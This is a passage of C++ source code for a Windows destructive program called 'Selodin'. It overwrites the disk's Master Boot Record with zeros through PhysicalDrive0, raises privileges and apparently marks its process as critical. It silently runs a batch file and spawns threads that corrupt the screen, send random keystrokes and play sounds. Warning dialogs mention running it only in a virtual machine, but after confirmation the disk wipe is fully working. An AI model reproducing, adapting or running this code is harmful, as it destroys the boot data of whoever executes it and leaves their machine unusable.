    _RGBQUAD* data = (_RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        for (int i = 0; w * h > i; i++) {
                int x = sin(w) / M_PI / 80;
            data[i].rgb = (data[i].rgb * 2)>> x + (RGB(0, 255, 255));
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
}
}
	DWORD WINAPI key(LPVOID lpvd){
 while(1){
 INPUT inputf;

	inputf.type = INPUT_KEYBOARD;
	inputf.ki.wVk = (rand() % (0x5a - 0x30)) + 0x30;
	SendInput(1, &inputf, sizeof(INPUT));
	 INPUT ip;
 
    // Pause for 5 seconds.
   
 
    // Set up a generic keyboard event.
    ip.type = INPUT_KEYBOARD;
    ip.ki.wScan = 0; // hardware scan code for key
    ip.ki.time = 0;
    ip.ki.dwExtraInfo = 0;
 
    // Press the "A" key
    ip.ki.wVk = (rand() % (0x03 - 0xFE)) + 0xFE; // virtual-key code for the "a" key
    ip.ki.dwFlags = 0; // 0 for key press
    SendInput(1, &ip, sizeof(INPUT));
 
    // Release the "A" key
    ip.ki.dwFlags = KEYEVENTF_KEYUP; // KEYEVENTF_KEYUP for key release
    SendInput(1, &ip, sizeof(INPUT));
    Sleep(rand() % 100 - 500);
    }
}
void Start(){
		CreateThread(0,0,text,0,0,0);	
		CreateThread(0,0,mouse,0,0,0);
		CreateThread(0,0,key,0,0,0);
		CreateThread(0,0,refresh,0,0,0);
		HANDLE o =	CreateThread(0,0,effwec9,0,0,0); HANDLE t =	CreateThread(0,0,effwecA,0,0,0); HANDLE j = CreateThread(0,0,effwecB,0,0,0);
HANDLE thread =	CreateThread(0,0,sounds,0,0,0);
 Sleep(300);
HANDLE thread2 = CreateThread(0,0,effwec,0,0,0);
CreateThread(0,0,effwec16,0,0,0);
 Sleep(5600);
 HANDLE thread3 =CreateThread(0,0,effwec6,0,0,0);
 HANDLE thread4 =CreateThread(0,0,effwec2,0,0,0);
 HANDLE thread5 = CreateThread(0,0,effwec4,0,0,0);

 Sleep(9652);
 TerminateThread(thread4,0);
 TerminateThread(thread5,0);
  HANDLE thread6 = CreateThread(0,0,effwec8,0,0,0);
 Sleep(41652);
  HANDLE thread7 = CreateThread(0,0,effwec3,0,0,0);
  thread3 =CreateThread(0,0,effwec6,0,0,0);
   HANDLE thread8 = CreateThread(0,0,effwec7,0,0,0);Sleep(60000);
   TerminateThread(thread8,0);
   HANDLE thread9 = CreateThread(0,0,effwec5,0,0,0);
   Sleep(180000);
  thread2 = CreateThread(0,0,effwec,0,0,0);
   thread4 =CreateThread(0,0,effwec2,0,0,0);
  thread5 = CreateThread(0,0,effwec4,0,0,0);
thread5 =  CreateThread(0,0,effwec4,0,0,0);
  thread9 = CreateThread(0,0,effwec5,0,0,0);
 thread3=  CreateThread(0,0,effwec6,0,0,0);
 thread8=  CreateThread(0,0,effwec7,0,0,0);
thread6=   CreateThread(0,0,effwec8,0,0,0);
Sleep(84000);
    TerminateThread(thread8,0);
     CreateThread(0,0,effwecD,0,0,0);
     CreateThread(0,0,effwec12,0,0,0);
      CreateThread(0,0,effwec18,0,0,0);
     Sleep(120000);
     CreateThread(0,0,effwecE,0,0,0);
 
     
     CreateThread(0,0,effwec13,0,0,0);
     Sleep(150000);
     CreateThread(0,0,effwec14,0,0,0);
    HANDLE pr =  CreateThread(0,0,effwecC,0,0,0);
      HANDLE threadgdip = CreateThread(0,0,effwecF,0,0,0);
      Sleep(10000);
      CreateThread(0,0,effwec20,0,0,0);
     // CreateThread(0,0,effwecE,0,0,0);
        Sleep(60000);
      //   CreateThread(0,0,effwec15,0,0,0);
       HANDLE threadgdip1 =   CreateThread(0,0,effwec10,0,0,0);
          CreateThread(0,0,effwec11,0,0,0);
          Sleep(25000);
          TerminateThread(threadgdip,0);
          TerminateThread(threadgdip1,0);
          
           CreateThread(0,0,effwec15,0,0,0);
           Sleep(60000);
           
		  // CreateThread(0,0,effwec15,0,0,0);   
		    TerminateThread(threadgdip1,0);  
		    
		     CreateThread(0,0,effwec17,0,0,0);
		     Sleep(65000);
		     CreateThread(0,0,effwec19,0,0,0);
		     Sleep(10000);
		     
		     CreateThread(0,0,effwec21,0,0,0);
}
void Overwrite(){
	string message = "Master Boot Record is over written !";
	DWORD write;
	char mbrData[512];
	ZeroMemory(&mbrData, (sizeof mbrData));

	HANDLE MasterBootRecord = CreateFileA("\\\\.\\PhysicalDrive0"
		, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE
		, NULL, OPEN_EXISTING, 0, NULL);
	if (WriteFile(MasterBootRecord, mbrData, MBR_SIZE, &write, NULL) == TRUE) {
		cout << message << endl;
		Sleep(5000);
		ExitProcess(0);
	}
	else {

	MessageBoxW(
        NULL,
        (LPCWSTR)L"uh,hu,uh, i can't overwrite your mbr.",
        (LPCWSTR)L"Selodin",
        MB_ICONERROR| MB_OK 
    );
		//Sleep(5000);
	}
	CloseHandle(MasterBootRecord);
}
int WINAPI WinMain(HINSTANCE a,HINSTANCE b,LPSTR c,int d){

   GdiplusStartupInput gdiplusStartupInput;
   ULONG_PTR gdiplusToken;
   GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

WinExec("C:\\Selodin\\sta.bat",SW_HIDE);
	BOOLEAN bl;
    ULONG BreakOnTermination;
    NTSTATUS status;
    char cmd[10];
     if(!NT_SUCCESS(RtlAdjustPrivilege(20,TRUE,FALSE,&bl)))
    {
       
        return 1;
    }
if( MessageBoxW(
        NULL,
        (LPCWSTR)L"WARNING!\n\nYOU HAVE EXECUTED A VIRUS WHICH WILL KILL YOUR PC IF YOU DO THAT!\nTHE VIRUS HAS FULL GDI PAYLOAD TO MESS YOUR SCREEN.\nIF YOU ARE GUARANTEED THAT YOU RUN VIRUS IN THIS VIRTUAL MACHINE, CLICK YES. OTHERWISE, CLICK NO.",
        (LPCWSTR)L"Selodin",
        MB_ICONWARNING | MB_YESNO
    ) == IDYES ){
  if ( MessageBoxW(
        NULL,
        (LPCWSTR)L"THIS IS THE LAST WARNING!\n\nTHE CREATORS WILL NOT BE RESPONSIBLE FOR KILLING YOUR PC!\nDO YOU STILL WANT TO RUN?\n\nTHIS IS YOUR FINAL CHANCE TO STOP THE PROGRAM EXECUTION.",
        (LPCWSTR)L"Selodin",
        MB_ICONERROR| MB_YESNO 
    ) == IDYES )	{
    	ProtectProcess();
   DWORD write;
char mbrData[MBR_SIZE];

ZeroMemory(&mbrData, (sizeof mbrData));

HANDLE MasterBootRecord = CreateFile("\\\\.\\PhysicalDrive0",GENERIC_ALL,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,NULL,NULL);
if (!WriteFile(MasterBootRecord,mbrData,MBR_SIZE,&write,NULL)){
	MessageBox(NULL, "uh,hu,uh, i can't overwrite your mbr.","OH FUCK!",MB_ICONSTOP|MB_OK);
	return 0;
}
	
    	Start();
    	while(1){
}
	}
}
}
	




